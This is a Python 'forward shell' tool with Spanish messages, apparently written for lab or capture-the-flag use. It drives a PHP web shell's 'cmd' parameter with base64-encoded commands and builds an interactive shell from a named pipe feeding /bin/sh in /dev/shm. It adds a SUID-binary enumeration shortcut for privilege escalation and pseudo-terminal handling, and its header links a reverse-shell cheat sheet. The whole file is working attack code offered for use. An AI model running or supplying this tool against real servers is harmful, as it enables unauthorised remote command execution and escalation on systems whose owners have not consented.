#!/usr/bin/env python3
"""

Forward Shell

Comandos para reverse shell: 
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

mkfifo input; tail -f input | /bin/sh 2>&1 > output

"""

import requests
import time

from termcolor import colored
from base64 import b64encode
from random import randrange


class ForwardShell:

    def __init__(self):

        session = randrange(100000, 999999)

        self.main_url = "http://localhost/index.php"

        self.stdin = f"/dev/shm/{session}.input"
        self.stdout = f"/dev/shm/{session}.output"

        self.help_options = {
            'enum suid': 'FileSystem SUID Privileges Enumeration',
            'help': 'Show this help panel',
        }

        self.is_pseudo_terminal = False

    def run_command(self, command):

        command = b64encode(command.encode()).decode()

        data = {
            'cmd': 'echo "%s" | base64 -d | /bin/sh' % command
        }

        try:
            r = requests.get(self.main_url, params=data, timeout=5)

            return r.text

        except:
            pass

        return None

    def write_stdin(self, command):

        command = b64encode(command.encode()).decode()

        data = {
            'cmd': 'echo "%s" | base64 -d > %s' % (command, self.stdin)
        }

        r = requests.get(self.main_url, params=data)

    def read_stdout(self):

        for _ in range(5):

            read_stdout_command = f"/bin/cat {self.stdout}"
            output_command = self.run_command(read_stdout_command)
            time.sleep(0.2)

        return output_command

    def setup_shell(self):

        command = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        self.run_command(command)

    def remove_data(self):

        remove_data_command = f"/bin/rm {self.stdin} {self.stdout}"
        self.run_command(remove_data_command)

    def clear_stdout(self):

        clear_stdout_command = f"echo '' > {self.stdout}"
        self.run_command(clear_stdout_command)

    def run(self) -> None:

        self.setup_shell()

        while True:

            command = input(colored("> ", "yellow"))

            if "script /dev/null -c bash" in command:

                print(
                    colored("[+] Se ha iniciado una pseudo-terminal", "blue"))
                self.is_pseudo_terminal = True


            if command.strip() == "enum suid":

                command = f"find / -perm -4000 2>/dev/null | xargs ls -l"

            if command.strip() == "help":

                print(colored(f"\n[+] Listando panel de ayuda:\n", "blue"))

                for key, value in self.help_options.items():
                    print(f"\t{key} - {value}")

                continue

            self.write_stdin(command + "\n")

            output_command = self.read_stdout()

            if command.strip() == "exit":

                self.is_pseudo_terminal = False
                print(colored("[+] Se ha cerrado la pseudo-terminal", "blue"))

                self.clear_stdout()
                continue


            if self.is_pseudo_terminal:
                lines = output_command.split("\n")

                if len(lines) == 1:

                    cleared_output = '\n'.join([lines[-1]] + lines[:1])

                elif len(lines) > 1:

                    cleared_output = '\n'.join(
                        [lines[-1]] + lines[:1] + lines[2:-1])

                else:
                    print(len(lines))
                    print(lines)

                print(cleared_output + "\n")

            else:

                print(output_command)

            self.clear_stdout()
